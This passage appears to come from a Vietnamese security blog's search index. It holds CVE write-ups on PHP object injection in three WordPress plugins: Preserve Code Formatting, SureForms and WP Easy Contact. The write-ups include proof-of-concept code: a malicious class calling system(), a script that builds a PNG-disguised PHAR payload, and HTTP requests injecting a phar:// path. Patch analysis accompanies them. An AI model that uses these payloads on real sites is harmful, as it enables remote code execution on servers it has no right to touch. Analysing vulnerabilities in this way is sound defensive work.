C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\rgraph TD\rA[\"Contributor submits Post\r(Content contains malicious Base64 payload)\"]\r--\u003e B[\"WordPress calls hook: content_save_pre\"]\rB --\u003e C[\"Plugin callback: preserve_postprocess()\"]\rC --\u003e D[\"Regex extracts preserve blocks\"]\rD --\u003e E[\"match[2] = Base64 payload\"]\rE --\u003e F[\"base64_decode()\"]\rF --\u003e G[\"stripslashes()\"]\rG --\u003e H[\"str_replace(chunk_split_token)\"]\rH --\u003e I[\"unserialize() on user data (VULNERABLE)\"]\rI --\u003e J[RCE]\r","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rT·∫°o class ƒë·ªÉ test ƒë·∫∑t trong wp-config.php class Evil { public $command = \"ls /\"; public function __destruct() { die(system($this-\u003ecommand)); } } T·∫°o post, cho request ƒëi qua proxy c·ªßa BurpSuite G·ª≠i l·∫°i request v·ªõi \"content\" l√† chu·ªói serialized ƒë∆∞·ª£c encode base64 K·∫øt qu·∫£\r","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rPhi√™n b·∫£n \u003c= 4.0.1 c·ªßa plugin Preserve Code Formatting m·∫Øc l·ªói nghi√™m tr·ªçng khi s·ª≠ d·ª•ng unserialize() tr√™n d·ªØ li·ªáu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c, cho ph√©p ƒë·ªëi t∆∞·ª£ng PHP t√πy √Ω ƒë∆∞·ª£c kh·ªüi t·∫°o trong qu√° tr√¨nh x·ª≠ l√Ω n·ªôi dung b√†i vi·∫øt. Ch·ªâ c·∫ßn quy·ªÅn Contributor, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë∆∞a payload v√†o n·ªôi dung post, d·∫´n ƒë·∫øn th·ª±c thi m√£ t·ª´ xa ho·∫∑c thao t√°c tr√°i ph√©p tr√™n h·ªá th·ªëng. B·∫£n v√° v5.0 ƒë√£ lo·∫°i b·ªè ho√†n to√†n vi·ªác d√πng unserialize(), thay th·∫ø b·∫±ng json_decode() v√† b·ªï sung b∆∞·ªõc ki·ªÉm tra t√≠nh an to√†n, t·ª´ ƒë√≥ tri·ªát ti√™u l·ªó h·ªïng Object Injection. ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\runserialize() tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng l√† nguy c∆° b·∫£o m·∫≠t nghi√™m tr·ªçng n·∫øu kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c. Hook content_save_pre t·∫°o ra b·ªÅ m·∫∑t t·∫•n c√¥ng v√¨ d·ªØ li·ªáu ch∆∞a ƒë∆∞·ª£c l·ªçc khi ƒëi v√†o h√†m x·ª≠ l√Ω. Quy·ªÅn Contributor ƒë·ªß ƒë·ªÉ k√≠ch ho·∫°t khai th√°c, m·ª©c ƒë·ªô r·ªßi ro cao tr√™n m√¥i tr∆∞·ªùng ƒëa user. B·∫£n v√° t·∫≠p trung v√†o thay ƒë·ªïi c∆° ch·∫ø x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o v√† th√™m x√°c th·ª±c ƒë·ªÉ lo·∫°i b·ªè kh·∫£ nƒÉng t·∫°o object t√πy √Ω. Vi·ªác thay th·∫ø unserialize() b·∫±ng c∆° ch·∫ø an to√†n h∆°n nh∆∞ JSON l√† h∆∞·ªõng x·ª≠ l√Ω ƒë√∫ng cho c√°c plugin WordPress t∆∞∆°ng t·ª±. ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress Preserve Code Formatting Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-20","objectID":"/vi/posts/2025-11-20-cve-2025-49386/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-20-cve-2025-49386/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress SureForm Plugin.","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin The SureForms ‚Äì Drag and Drop Form Builder for WordPress cho WordPress t·ªìn t·∫°i l·ªó h·ªïng PHP Object Injection trong t·∫•t c·∫£ c√°c phi√™n b·∫£n cho ƒë·∫øn, v√† bao g·ªìm, 1.7.3 th√¥ng qua vi·ªác s·ª≠ d·ª•ng file_exists() trong h√†m delete_entry_files() m√† kh√¥ng c√≥ gi·ªõi h·∫°n ƒë·ªëi v·ªõi ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c cung c·∫•p. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ inject m·ªôt PHP Object. Kh√¥ng c√≥ POP chain n√†o ƒë∆∞·ª£c bi·∫øt ƒë·∫øn trong ph·∫ßn m·ªÅm d·ªÖ b·ªã t·∫•n c√¥ng n√†y, nghƒ©a l√† l·ªó h·ªïng n√†y kh√¥ng c√≥ t√°c ƒë·ªông tr·ª´ khi m·ªôt plugin ho·∫∑c theme kh√°c ch·ª©a POP chain ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n site. N·∫øu m·ªôt POP chain t·ªìn t·∫°i th√¥ng qua plugin ho·∫∑c theme b·ªï sung ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n h·ªá th·ªëng m·ª•c ti√™u, n√≥ c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c hi·ªán c√°c h√†nh ƒë·ªông nh∆∞ x√≥a file t√πy √Ω, l·∫•y d·ªØ li·ªáu nh·∫°y c·∫£m, ho·∫∑c th·ª±c thi code t√πy thu·ªôc v√†o POP chain hi·ªán di·ªán. CVE ID: CVE-2025-6742 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 1.7.3 Patched Versions: 1.7.4 CVSS severity: High (7.5) Required Privilege: Unauthenticated Product: WordPress SureForm Plugin ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - SureForm: 1.7.3 ‚Äì vulnerable 1.7.4 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rTrong phi√™n b·∫£n 1.7.3, h√†m delete_entry_files() nh·∫≠n v√†o m·ªôt $file_url, sau ƒë√≥ decode url v√† chuy·ªÉn ƒë·ªïi th√†nh ƒë∆∞·ªùng d·∫´n b·∫±ng $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); Ti·∫øp theo n√≥ g·ªçi tr·ª±c ti·∫øp: // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } ƒêo·∫°n code n√†y ki·ªÉm tra s·ª± t·ªìn t·∫°i c·ªßa file b·∫±ng file_exists() v√† s·ª≠ d·ª•ng unlink() ƒë·ªÉ x√≥a n·∫øu n√≥ t·ªìn t·∫°i. S·ª± thay ƒë·ªïi trong b·∫£n v√°\rTrong b·∫£n v√°, ƒëo·∫°n code tr√™n ƒë∆∞·ª£c thay th·∫ø b·∫±ng: // Delete the file from the uploads directory. Helper::delete_upload_file_from_subdir( $file_url, 'sureforms/' ); public static function delete_upload_file_from_subdir( $file_url, $subdir = 'sureforms/' ) { // Decode the file URL. $file_url = urldecode( $file_url ); // Check if the file URL is empty. if ( empty( $file_url ) || ! is_string( $file_url ) ) { return false; } // Normalize and sanitize the subdirectory. $subdir = trailingslashit( sanitize_text_field( $subdir ) ); // Get the base upload directory. $upload_dir = wp_upload_dir(); $base_upload_path = trailingslashit( $upload_dir['basedir'] ) . $subdir; // Extract only the filename from URL. $filename = basename( $file_url ); // Construct the full file path. $file_path = $base_upload_path . $filename; // Resolve real paths. $real_file_path = realpath( $file_path ); $real_base_path = realpath( $base_upload_path ); // Security check: ensure file is inside the target subdir. if ( ! $real_file_path || ! $real_base_path || strpos( $real_file_path, $real_base_path ) !== 0 ) { return false; } // Delete if file exists. if ( file_exists( $real_file_path ) ) { return unlink( $real_file_path ); } return false; } H√†m m·ªõi delete_upload_file_from_subdir() th·ª±c hi·ªán nhi·ªÅu b∆∞·ªõc ki·ªÉm tra b·∫£o m·∫≠t, ch·ªâ cho ph√©p x√≥a file n·∫±m trong th∆∞ m·ª•c uploads/sureforms/, v·ªõi t√™n file h·ª£p l·ªá. Theo nh∆∞ m√¥ t·∫£ th√¨ CVE n√†y li√™n quan ƒë·∫øn l·ªó h·ªïng PHP Object Injection m√† sink ·ªü ƒë√¢y l√† h√†m file_exists() th√¨ ch·ªâ c√≥ x·∫£y ra v·ªõi tr∆∞·ªùng h·ª£p PHAR Deserialization, t·ª©c $file_path ·ªü ƒë√¢y ph·∫£i thu·ªôc d·∫°ng phar://phar_file.\r","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rpublic static function delete_entry_files( $entry_id ) { if ( ! $entry_id ) { return; } // Get the entry data to get the file URLs. $form_data = Entries::get_form_data( $entry_id ); if ( empty( $form_data ) ) { return; } foreach ( $form_data as $field_name =\u003e $value ) { // Continue to the next iteration if the field name does not contain 'srfm-upload' and value is not an array. if ( false === strpos( $field_name, 'srfm-upload' ) \u0026\u0026 ! is_array( $value ) ) { continue; } foreach ( $value as $file_url ) { // If the file URL is empty, skip to the next iteration. if ( empty( $file_url ) ) { continue; } $file_path = Helper::convert_fileurl_to_filepath( urldecode( $file_url ) ); // Delete the file if it exists. if ( file_exists( $file_path ) ) { unlink( $file_path ); } } } ... } Sau khi xem qua logic c·ªßa h√†m delete_entry_files(), t√¥i nh·∫≠n th·∫•y c√°c t·ª´ kh√≥a nh∆∞ entries xu·∫•t hi·ªán kh√° nhi·ªÅu. C√≥ s·ª± tr√πng h·ª£p ·ªü ƒë√¢y: Entry trong UI\rC√≥ v·∫ª ƒë√∫ng, nh∆∞ng nh∆∞ b·∫°n th·∫•y th√¥ng b√°o \"No records found\", ch∆∞a c√≥ d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã. V·∫≠y ta th√™m nh∆∞ n√†o? $form_data = Entries::get_form_data( $entry_id ); Nh√¨n v√†o t√™n h√†m ƒë∆∞·ª£c g·ªçi: get_form_data th√¨ kh·∫£ nƒÉng cao d·ªØ li·ªáu ƒë∆∞·ª£c l·∫•y t·ª´ form do client submit v√¨ l·ªó h·ªïng n√†y ƒë∆∞·ª£c c√¥ng b·ªë l√† Unauthenticated Th·ª≠ t·∫°o form b·∫±ng ch·ª©c nƒÉng c·ªßa plugin: T·∫°o form\rT·∫°o post v√† embed shortcode c·ªßa form v·ª´a t·∫°o: Embed Shortcode\rTruy c·∫≠p form ƒë∆∞·ª£c t·∫°o v√† submit d·ªØ li·ªáu b·∫•t k·ª≥: POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Length: 730 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field\" testing ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- Submit form t·ª´ Unauthenticated user\rResponse tr·∫£ v·ªÅ m·ªôt s·ªë tr∆∞·ªùng nh∆∞: tr·∫°ng th√°i v√† id c·ªßa submit. T√™n delete_entry_files ƒë·ªÅ c·∫≠p ƒë·∫øn vi·ªác x√≥a m·ªôt entry, ta th·ª≠ ƒë·∫∑t breakpoint ƒë·∫ßu h√†m v√† th·ª≠ x√≥a 1 entry. Debugger ho·∫°t ƒë·ªông khi x√≥a entry\rTi·∫øp t·ª•c debug G√°i tr·ªã c·ªßa $value\rTa th·∫•y $value l√† gi√° tr·ªã do ta ki·ªÉm so√°t. $value c·∫ßn ph·∫£i l√† m·ªôt m·∫£ng ƒë·ªÉ n√≥ kh√¥ng b·ªã b·ªè qua continue v√† ƒë·ªÉ file_exists() c√≥ th·ªÉ ƒë∆∞·ª£c g·ªçi. ƒê·ªÉ $value l√† m·ªôt m·∫£ng, ta submit v·ªõi name ch·ª©a [] ·ªü cu·ªëi: ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" testing G√°i tr·ªã c·ªßa $value\r","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rKhi ƒë√£ debug ƒë∆∞·ª£c r·ªìi th√¨ ta s·∫Ω th·∫•y lu·ªìng d·∫´n t·ªõi sink: graph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\rgraph TD\rA[\"Client submit form\"] --\u003e B[\"Admin delete entry\"]\rB --\u003e C[\"WordPress hook: admin_init\"]\rC --\u003e D[\"handle_entry_actions\"]\rD --\u003e E[\"Entries_List_Table::handle_entry_status()\"]\rE -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"]\rF --\u003e G{\"$value is array\"}\rG -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"]\rG -- No --\u003e K[\"continue\"]\r","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rS·ª≠ d·ª•ng admin account ƒë·ªÉ t·∫°o form v√† th√™m v√†o post T·∫°o 1 PHP file create_phar.php v·ªõi code sau: \u003c?php // ƒê·ªãnh nghƒ©a class Evil v·ªõi thu·ªôc t√≠nh v√† h√†m __wakeup class Evil { // Thu·ªôc t√≠nh command ch·ª©a l·ªánh h·ªá th·ªëng s·∫Ω th·ª±c thi public $command = \"ls /\"; // H√†m __wakeup() ƒë∆∞·ª£c g·ªçi khi object n√†y b·ªã unserialize public function __wakeup(): void { // Khi unserialize, s·∫Ω th·ª±c thi l·ªánh trong $command v√† d·ª´ng ch∆∞∆°ng tr√¨nh die(system($this-\u003ecommand)); } } // T·∫°o m·ªôt file PHAR m·ªõi t√™n poc.phar $phar = new Phar('poc.phar'); // B·∫Øt ƒë·∫ßu ghi d·ªØ li·ªáu v√†o PHAR (buffering) $phar-\u003estartBuffering(); // Th√™m m·ªôt entry gi·∫£ t√™n test.png v·ªõi n·ªôi dung \"text\" $phar-\u003eaddFromString('test.png', 'text'); // ƒê·∫∑t stub cho PHAR: b·∫Øt ƒë·∫ßu b·∫±ng magic bytes c·ªßa PNG ƒë·ªÉ gi·∫£ d·∫°ng file ·∫£nh, // sau ƒë√≥ c√≥ ƒëo·∫°n PHP __HALT_COMPILER() ƒë·ªÉ ƒë√°nh d·∫•u k·∫øt th√∫c stub $phar-\u003esetStub(\"\\x89PNG\\r\\n\\x1a\\n\u003c?php __HALT_COMPILER(); ?\u003e\"); // Ghi metadata v√†o PHAR: ·ªü ƒë√¢y l√† m·ªôt object Evil ƒë√£ kh·ªüi t·∫°o // Metadata s·∫Ω ƒë∆∞·ª£c serialize, v√† n·∫øu b·ªã unserialize s·∫Ω k√≠ch ho·∫°t __wakeup() $phar-\u003esetMetadata(new Evil()); // K·∫øt th√∫c ghi, flush d·ªØ li·ªáu ra file poc.phar $phar-\u003estopBuffering(); T·∫°o PHAR file poc.phar b·∫±ng c√°ch ch·∫°y php --define phar.readonly=0 create_phar.php. Th√¥ng tin\rphar.readonly l√† m·ªôt directive trong PHP (c·∫•u h√¨nh c·ªßa extension Phar). M·∫∑c ƒë·ªãnh gi√° tr·ªã c·ªßa n√≥ l√† 1 (readonly) kh√¥ng th·ªÉ t·∫°o file. Khi mu·ªën t·∫°o file PHAR, c·∫ßn t·∫Øt ch·∫ø ƒë·ªô readonly b·∫±ng c√°ch th√™m option phar.readonly=0 ho·∫∑c c·∫•u h√¨nh trong php.ini ƒê·ªïi t√™n poc.phar th√†nh poc.png v√¨ th√¥ng th∆∞·ªùng c√°c tr∆∞·ªùng h·ª£p s·∫Ω ch·∫•p nh·∫≠n upload file ·∫£nh thay v√¨ .phar Upload poc.jpg b·∫±ng Tr√¨nh ch·ªânh s·ª≠a ph∆∞∆°ng ti·ªán. L∆∞u √Ω ƒë∆∞·ªùng d·∫´n c·ªßa n√≥ trong wp-content/uploads. G·ª≠i l·∫°i request submit form: POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Length: 775 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" phar://../../../wp-content/uploads/2025/11/poc.png ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- Khi admin x√≥a entry ƒë√£ upload RCE khi admin x√≥a entry\rC·∫£nh b√°o Sau khi th·ª≠ nhi·ªÅu phi√™n b·∫£n PHP kh√°c nhau, t√¥i nh·∫≠n th·∫•y r·∫±ng: H√†m file_exists() ch·ªâ ho·∫°t ƒë·ªông ·ªü c√°c phi√™n b·∫£n \u003c=7.4 M·ªôt s·ªë h√†m kh√°c d√πng ƒë·ªÉ khai th√°c PHAR Deserialization: copy file_exists file_get_contents file_put_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype fopen is_dir is_executable is_file is_link is_readable is_writable lstat mkdir parse_ini_file readfile rename rmdir stat touch unlink ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rL·ªó h·ªïng PHP Object Injection trong SureForm \u003c= 1.7.3 xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng file_exists() v√† unlink() tr·ª±c ti·∫øp tr√™n ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c ki·ªÉm so√°t b·ªüi user m√† kh√¥ng c√≥ r√†ng bu·ªôc ph·∫°m vi truy c·∫≠p file. Tuy kh√¥ng c√≥ POP chain s·∫µn trong plugin, nh∆∞ng n·∫øu h·ªá th·ªëng c√†i ƒë·∫∑t th√™m plugin ho·∫∑c theme c√≥ POP chain, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ m·ªü r·ªông m·ª©c ƒë·ªô khai th√°c ƒë·∫øn x√≥a file, ƒë·ªçc d·ªØ li·ªáu nh·∫°y c·∫£m ho·∫∑c th·∫≠m ch√≠ th·ª±c thi m√£ (RCE). B·∫£n v√° 1.7.4 x·ª≠ l√Ω v·∫•n ƒë·ªÅ b·∫±ng vi·ªác chu·∫©n ho√° v√† gi·ªõi h·∫°n ƒë∆∞·ªùng d·∫´n file v√†o th∆∞ m·ª•c upload h·ª£p l·ªá nh·∫±m lo·∫°i b·ªè vector khai th√°c. ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways\rL·ªói ph√°t sinh t·ª´ vi·ªác thao t√°c file tr·ª±c ti·∫øp d·ª±a tr√™n input ng∆∞·ªùi d√πng ch∆∞a ki·ªÉm so√°t. Vi·ªác ch·ªâ d√πng file_exists() c√≥ th·ªÉ d·∫´n ƒë·∫øn PHAR deserialization tr√™n PHP ‚â§7.4. D√π plugin kh√¥ng c√≥ POP chain s·∫µn, m√¥i tr∆∞·ªùng WordPress th∆∞·ªùng c√†i nhi·ªÅu plugin ‚Üí kh·∫£ nƒÉng gh√©p chain r·∫•t cao. B·∫£n v√° th√™m ki·ªÉm tra chu·∫©n h√≥a ƒë∆∞·ªùng d·∫´n, gi·ªõi h·∫°n ph·∫°m vi file v√† tr√°nh s·ª≠ d·ª•ng tr·ª±c ti·∫øp path ƒë·∫øn filesystem. C√°c h√†m file-operation lu√¥n ti·ªÅm ·∫©n nguy c∆° khai th√°c n·∫øu input kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t ch·∫∑t ch·∫Ω. ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rDeserialization WordPress SureForm Plugin \u003c= 1.7.3 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-19","objectID":"/vi/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/vi/posts/2025-11-19-cve-2025-6742/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Easy Contact Plugin.","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rL·ªó h·ªïng Deserialization of Untrusted Data trong emarket-design WP Easy Contact cho ph√©p Object Injection. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn WP Easy Contact: t·ª´ n/a ƒë·∫øn 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 4.0.2 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress WP Easy Contact Plugin ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - WP Easy Contact: 4.0.1 ‚Äì vulnerable 4.0.2 ‚Äì patched Diff Tool (diff) ‚Üí Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o. ","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rL·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác cho ph√©p attacker kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t√πy √Ω t·ª´ input ‚Üí PHP Object Injection. $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); B·∫£n v√° b·ªï sung whitelist v√† sanitize input ‚Üí ch·ªâ cho ph√©p kh·ªüi t·∫°o class h·ª£p l·ªá, lo·∫°i b·ªè l·ªó h·ªïng. S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°\r","date":"2025-11-18","objectID":"/vi/posts/2025-11-18-cve-2025-53572/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/vi/posts/2025-11-18-cve-2025-53572/#cause"},{"categories":["CVE 